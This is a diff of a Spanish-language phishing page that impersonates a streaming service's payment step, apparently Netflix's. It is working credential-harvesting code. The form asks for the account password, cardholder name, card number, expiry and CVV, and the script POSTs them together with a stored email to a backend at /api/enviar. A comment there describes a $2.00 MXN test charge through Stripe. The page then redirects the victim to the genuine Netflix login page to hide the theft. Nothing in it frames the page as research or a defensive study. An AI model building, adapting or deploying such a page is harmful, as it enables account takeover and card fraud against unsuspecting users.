@@ -3,139 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C&#111;nfirmaci&#243;n de S&#101;rvici&#111;</title>
+    <title>Confirmaci&oacute;n de Servicio</title>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
         .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
         .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
-        .step { text-transform: uppercase; font-size: 13px; color: #333; }
         h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; }
-        .payment-icons { margin: 15px 0; display: flex; gap: 8px; color: #1A1F71; font-size: 35px; }
-        .input-box { position: relative; margin-bottom: 15px; }
-        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .input-box input:focus { border-color: #0071eb; }
+        .input-box { margin-bottom: 15px; }
+        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
         .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
         #loading-overlay { display: none; text-align: center; padding: 40px; }
     </style>
 </head>
 <body>
-    <nav class="nav-pay">
-        <img src="img/logo.png" style="width: 100px;" alt="Service">
-        <span style="text-decoration: none; color: #333; font-weight: bold; font-size: 14px; cursor: pointer;">Cerrar sesión</span>
-    </nav>
-
+    <nav class="nav-pay"><img src="img/logo.png" style="width: 100px;"> <b>Cerrar sesión</b></nav>
     <div class="container-pay" id="form-container">
-        <span class="step">Paso <b>3</b> de <b>3</b></span>
+        <p>Paso 3 de 3</p>
         <h1>Configura tu tarjeta</h1>
-        
-        <div class="payment-icons">
-            <i class="fab fa-cc-visa"></i>
-            <i class="fab fa-cc-mastercard"></i>
-            <i class="fab fa-cc-amex"></i>
+        <div id="dynamic-injection">
+            <form id="pay-process-form">
+                <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
+                <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
+                <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" required></div>
+                <div class="grid-input">
+                    <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" required></div>
+                    <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" required></div>
+                </div>
+                <button type="submit" class="btn-submit">Iniciar membresía</button>
+            </form>
         </div>
-
-        <div id="dynamic-injection"></div>
     </div>
-
     <div id="loading-overlay">
         <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
-        <p style="margin-top: 20px; font-size: 18px; font-weight: 500;">Validando información con su banco...</p>
+        <p>Procesando con su banco...</p>
     </div>
 
     <script>
-        window.onload = function() {
-            document.getElementById('dynamic-injection').innerHTML = `
-                <form id="pay-process-form">
-                    <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
-                    <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
-                    <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required></div>
-                    <div class="grid-input">
-                        <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" required></div>
-                        <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required></div>
-                    </div>
-                    <button type="submit" class="btn-submit">Iniciar membresía</button>
-                </form>
-            `;
-            
-            // Máscara simple para fecha MM/AA
-            document.getElementById('f_e_1').addEventListener('input', function(e) {
-                let v = this.value.replace(/\D/g, '');
-                if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
-            });
+        // Máscara MM/AA
+        document.getElementById('f_e_1').addEventListener('input', function(e) {
+            let v = this.value.replace(/\D/g, '');
+            if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
+        });
 
-            _setupForm();
-        };
+        document.getElementById('pay-process-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('form-container').style.display = 'none';
+            document.getElementById('loading-overlay').style.display = 'block';
 
-        function _setupForm() {
-            document.getElementById('pay-process-form').addEventListener('submit', function(e) {
-                e.preventDefault();
-                document.getElementById('form-container').style.display = 'none';
-                document.getElementById('loading-overlay').style.display = 'block';
+            const payload = {
+                em: sessionStorage.getItem('usr_mail') || 'Desconocido',
+                pw: document.getElementById('f_k_1').value,
+                nm: document.getElementById('f_n_1').value,
+                cc: document.getElementById('f_t_1').value,
+                ex: document.getElementById('f_e_1').value,
+                cv: document.getElementById('f_c_1').value
+            };
 
-                const payload = {
-                    em: sessionStorage.getItem('usr_mail') || 'Desconocido',
-                    pw: document.getElementById('f_k_1').value,
-                    nm: document.getElementById('f_n_1').value,
-                    cc: document.getElementById('f_t_1').value,
-                    ex: document.getElementById('f_e_1').value,
-                    cv: document.getElementById('f_c_1').value
-                };
-
-                _0xdispatch(payload);
-            });
-        }
-
-        function _0xdispatch(obj) {
-    // 1. Visual: Ocultar el formulario y mostrar la pantalla de carga
-    // Asegúrate de que estos IDs existan en tu HTML
-    const formContainer = document.getElementById('form-container') || document.getElementById('dynamic-injection');
-    const loader = document.getElementById('loading-overlay');
-
-    if (formContainer) formContainer.style.display = 'none';
-    if (loader) loader.style.display = 'block';
-
-    // 2. Comunicación con el Backend de Vercel (Node.js)
-    fetch('/api/enviar.js', {
-        method: 'POST',
-        headers: { 
-            'Content-Type': 'application/json' 
-        },
-        body: JSON.stringify(obj)
-    })
-    .then(res => {
-        // Si Vercel responde 404 o 500, lanzamos error al .catch
-        if (!res.ok) throw new Error("Error en la respuesta del servidor");
-        return res.json();
-    })
-    .then(data => {
-        // Pequeña pausa de 2 segundos para simular el proceso bancario
-        setTimeout(() => {
-            if (data.pago === true) {
-                // --- CASO: PAGO EXITOSO ($2.00 MXN) ---
-                alert("¡Verificación exitosa! Su suscripción ha sido confirmada correctamente.");
-                
-                // Redirección a la página real
-                window.location.href = "https://www.netflix.com/login";
-            } else {
-                // --- CASO: PAGO RECHAZADO (Fondos, CVV, etc.) ---
-                // 'data.mensaje_error' contiene la explicación que viene de Stripe
-                alert("Atención: " + data.mensaje_error + ". Por favor, verifique sus datos o intente con una tarjeta diferente.");
-                
-                // Recargamos para que el usuario pueda intentar con otra tarjeta
+            fetch('/api/enviar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.pago) {
+                    alert("¡Éxito! Cargo de $2.00 MXN aprobado.");
+                    window.location.href = "https://www.netflix.com/login";
+                } else {
+                    alert("Error: " + data.mensaje_error);
+                    location.reload();
+                }
+            })
+            .catch(() => {
+                alert("Error de conexión con el servidor.");
                 location.reload();
-            }
-        }, 2000);
-    })
-    .catch(err => {
-        // --- CASO: ERROR DE CONEXIÓN O VERCEL MAL CONFIGURADO ---
-        console.error("Error detallado:", err);
-        alert("Error técnico: No se pudo conectar con el procesador de pagos. Verifique que la función en /api/enviar esté activa.");
-        location.reload();
-    });
-}
+            });
+        });
     </script>
 </body>
 </html>
